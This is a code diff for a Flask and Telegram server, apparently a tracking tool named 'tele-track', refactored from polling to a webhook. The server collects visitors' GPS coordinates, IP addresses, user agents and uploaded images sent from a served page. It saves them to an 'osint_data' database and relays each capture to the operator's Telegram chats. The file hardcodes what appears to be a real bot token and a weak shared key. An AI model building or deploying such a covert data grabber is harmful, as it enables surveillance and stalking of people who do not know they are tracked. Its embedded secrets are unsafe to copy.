@@ -1,44 +1,55 @@
 import os
 import sqlite3
-import threading
 from datetime import datetime
 from flask import Flask, request, jsonify, send_file
-from telegram import Update
-from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
-import requests
+from telegram import Update, Bot
+from telegram.ext import (
+    ApplicationBuilder,
+    CommandHandler,
+    ContextTypes,
+)
 import asyncio
+import requests
 
-# -------------------- Flask Setup --------------------
-app = Flask(__name__)
+# -------------------- Config --------------------
+TELEGRAM_BOT_TOKEN = "8068204110:AAELqo2Dres3tX5pvlC5O2wopyqFwaP2AM0"
+AUTHORIZED_KEY = "secretkey123"
+WEBHOOK_URL = "https://tele-track-syk8.onrender.com/webhook"  # Replace with your actual Render URL
 
-# -------------------- Folder Setup --------------------
 SAVE_FOLDER = "saved_files"
 os.makedirs(SAVE_FOLDER, exist_ok=True)
+authenticated_users = set()
 
-# -------------------- Database Setup --------------------
+# -------------------- Flask App --------------------
+app = Flask(__name__)
+
+# -------------------- Telegram Bot --------------------
+bot = Bot(token=TELEGRAM_BOT_TOKEN)
+application = ApplicationBuilder().token(TELEGRAM_BOT_TOKEN).build()
+
+# -------------------- DB Setup --------------------
 def init_db():
     conn = sqlite3.connect('osint_data.db')
     c = conn.cursor()
-    c.execute('''CREATE TABLE IF NOT EXISTS osint_data
-                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
-                  type TEXT,
-                  latitude REAL,
-                  longitude REAL,
-                  accuracy REAL,
-                  timestamp TEXT,
-                  ip_address TEXT,
-                  user_agent TEXT,
-                  file_path TEXT)''')
+    c.execute('''
+        CREATE TABLE IF NOT EXISTS osint_data (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            type TEXT,
+            latitude REAL,
+            longitude REAL,
+            accuracy REAL,
+            timestamp TEXT,
+            ip_address TEXT,
+            user_agent TEXT,
+            file_path TEXT
+        )
+    ''')
     conn.commit()
     conn.close()
 
 init_db()
 
-# -------------------- Telegram Bot Setup --------------------
-TELEGRAM_BOT_TOKEN = "8068204110:AAELqo2Dres3tX5pvlC5O2wopyqFwaP2AM0"  # Replace with your actual bot token
-AUTHORIZED_KEY = "secretkey123"  # Your auth key for users
-authenticated_users = set()
-
+# -------------------- Telegram Functions --------------------
 def send_telegram_message(message):
     for user_id in authenticated_users:
         url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
@@ -57,7 +68,7 @@ def send_telegram_image(image_path, caption=""):
             data = {"chat_id": user_id, "caption": caption}
             requests.post(url, files=files, data=data)
 
-# Telegram Command Handlers
+# -------------------- Telegram Command Handlers --------------------
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     if user_id not in authenticated_users:
@@ -100,33 +111,22 @@ async def delete(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     await update.message.reply_text(f"🗑️ Deleted {deleted_files} image(s) and cleared database.")
 
-def run_bot():
-    try:
-        # Create and set a new event loop for this thread
-        loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(loop)
-
-        application = ApplicationBuilder().token(TELEGRAM_BOT_TOKEN).build()
-
-        application.add_handler(CommandHandler("start", start))
-        application.add_handler(CommandHandler("auth", auth))
-        application.add_handler(CommandHandler("chatid", chatid))
-        application.add_handler(CommandHandler("delete", delete))
-
-        # Run polling with the newly set event loop
-        application.run_polling()
-    except Exception as e:
-        print(f"[❌] Bot failed to start: {e}")
-        import traceback
-        traceback.print_exc()
-
-    application.run_polling()
+# Register Handlers
+application.add_handler(CommandHandler("start", start))
+application.add_handler(CommandHandler("auth", auth))
+application.add_handler(CommandHandler("chatid", chatid))
+application.add_handler(CommandHandler("delete", delete))
 
 # -------------------- Flask Routes --------------------
 @app.route('/')
 def index():
-    # Serve your frontend page if you have one
     return send_file('index.html')
+
+@app.route('/webhook', methods=['POST'])
+def webhook():
+    update = Update.de_json(request.get_json(force=True), bot)
+    asyncio.run(application.process_update(update))
+    return "OK"
 
 @app.route('/location', methods=['POST'])
 def receive_location():
@@ -148,7 +148,7 @@ def receive_location():
     conn.commit()
     conn.close()
 
-    # Prepare message for Telegram (vertical new lines and clickable map)
+    # Telegram Message
     message = (
         f"📍 *New Location Received:*\n"
         f"Latitude: `{lat}`\n"
@@ -158,13 +158,7 @@ def receive_location():
         f"IP: `{ip_address}`\n"
         f"User Agent: `{user_agent}`"
     )
-
-    # Send to Telegram
     send_telegram_message(message)
-
-    # Print to console
-    print(f"[Location] IP: {ip_address}, UA: {user_agent}, Coordinates: ({lat}, {lon}), Accuracy: {accuracy}")
-
     return jsonify({"status": "OK"}), 200
 
 @app.route('/upload_image', methods=['POST'])
@@ -187,16 +181,15 @@ def upload_image():
     conn.close()
 
     send_telegram_image(filename, caption="🖼️ New Image Uploaded")
-
-    print(f"[Image] Saved and sent: {filename}")
-
     return jsonify({"status": "OK"}), 200
 
-# -------------------- Main --------------------
+# -------------------- Start Server --------------------
 if __name__ == '__main__':
-    # Start Telegram bot polling in a separate thread
-    threading.Thread(target=run_bot, daemon=True).start()
+    # Set webhook when server starts
+    response = requests.get(
+        f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/setWebhook?url={WEBHOOK_URL}"
+    )
+    print("🔗 Webhook Set:", response.json())
 
-    # Start Flask app
-    print("🚀 Starting Flask server on http://0.0.0.0:5000")
-    app.run(host='0.0.0.0', port=5000, debug=True, use_reloader=False)
+    print("🚀 Starting Flask server...")
+    app.run(host="0.0.0.0", port=5000)
